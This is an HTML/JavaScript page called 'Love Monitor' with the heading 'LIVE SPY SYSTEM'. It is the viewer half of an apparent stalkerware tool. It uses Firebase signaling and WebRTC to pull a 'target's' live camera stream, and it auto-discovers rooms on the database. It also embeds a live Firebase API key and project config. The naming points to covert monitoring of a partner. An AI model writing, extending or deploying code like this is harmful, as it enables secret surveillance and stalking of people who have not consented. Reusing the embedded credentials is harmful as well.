<!DOCTYPE html>
<html>
<head>
    <title>🕵️‍♂️ Love Monitor</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: black;
            color: lime;
            font-family: monospace;
        }
        #remoteVideo {
            width: 100%;
            max-width: 600px;
            border: 3px solid red;
            margin: 20px 0;
        }
        #roomInput {
            padding: 10px;
            width: 300px;
            margin: 10px;
        }
        #connectBtn {
            background: red;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        .log {
            background: #111;
            padding: 10px;
            margin: 10px 0;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <h1>🔴 LIVE SPY SYSTEM</h1>
    
    <div>
        <input type="text" id="roomInput" placeholder="Room ID dari target">
        <button id="connectBtn" onclick="connectToTarget()">🎯 CONNECT</button>
    </div>
    
    <video id="remoteVideo" autoplay playsinline></video>
    
    <div id="status">🟡 Waiting for connection...</div>
    
    <div class="log" id="log"></div>

    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
    
    <script>
        // =============== FIREBASE ===============
        const firebaseConfig = {
            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
            authDomain: "survei-f11a1.firebaseapp.com",
            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "survei-f11a1",
            storageBucket: "survei-f11a1.firebasestorage.app",
            messagingSenderId: "769641850914",
            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        // =============== WEBRTC VARIABLES ===============
        let peerConnection;
        let roomId;
        
        // =============== CONNECT TO TARGET ===============
        async function connectToTarget() {
            roomId = document.getElementById('roomInput').value.trim();
            if (!roomId) {
                log("❌ Masukkan Room ID!");
                return;
            }
            
            log("🔗 Connecting to room: " + roomId);
            
            try {
                // 1. CHECK IF ROOM EXISTS
                const snapshot = await db.ref('rooms/' + roomId).once('value');
                if (!snapshot.exists()) {
                    log("❌ Room tidak ditemukan!");
                    return;
                }
                
                // 2. SETUP WEBRTC
                setupWebRTC();
                
                // 3. CREATE AND SEND OFFER
                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                
                // Send offer to target
                await db.ref('rooms/' + roomId + '/offer').set(offer);
                
                log("📤 Offer sent to target...");
                
                // 4. LISTEN FOR ANSWER
                listenForAnswer();
                
                // 5. LISTEN FOR TARGET'S ICE CANDIDATES
                listenForTargetCandidates();
                
            } catch (err) {
                log("❌ Error: " + err.message);
            }
        }
        
        // =============== WEBRTC SETUP ===============
        function setupWebRTC() {
            const config = {
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            };
            
            peerConnection = new RTCPeerConnection(config);
            
            // Handle incoming stream
            peerConnection.ontrack = (event) => {
                log("🎥 Stream received!");
                const remoteVideo = document.getElementById('remoteVideo');
                remoteVideo.srcObject = event.streams[0];
                document.getElementById('status').textContent = "🟢 LIVE STREAM ACTIVE";
            };
            
            // ICE Candidate handler
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    db.ref('rooms/' + roomId + '/candidates/spy').push({
                        candidate: event.candidate
                    });
                }
            };
            
            // Connection state
            peerConnection.onconnectionstatechange = () => {
                log("Connection state: " + peerConnection.connectionState);
            };
        }
        
        // =============== LISTEN FOR ANSWER ===============
        function listenForAnswer() {
            db.ref('rooms/' + roomId + '/answer').on('value', async (snapshot) => {
                const answer = snapshot.val();
                if (answer && peerConnection.signalingState !== 'stable') {
                    log("📥 Answer received!");
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                }
            });
        }
        
        // =============== LISTEN FOR TARGET CANDIDATES ===============
        function listenForTargetCandidates() {
            db.ref('rooms/' + roomId + '/candidates/target').on('child_added', async (snapshot) => {
                const data = snapshot.val();
                if (data && data.candidate) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
                        log("✅ ICE candidate added");
                    } catch (e) {
                        log("❌ ICE error: " + e.message);
                    }
                }
            });
        }
        
        // =============== UTILS ===============
        function log(message) {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.textContent = new Date().toLocaleTimeString() + " - " + message;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        // =============== AUTO-DISCOVER ROOMS ===============
        db.ref('rooms').on('value', (snapshot) => {
            const rooms = snapshot.val();
            if (rooms) {
                const roomList = Object.keys(rooms);
                if (roomList.length > 0) {
                    document.getElementById('roomInput').value = roomList[0];
                    log("🔍 Found room: " + roomList[0]);
                }
            }
        });
    </script>
</body>
    </html>
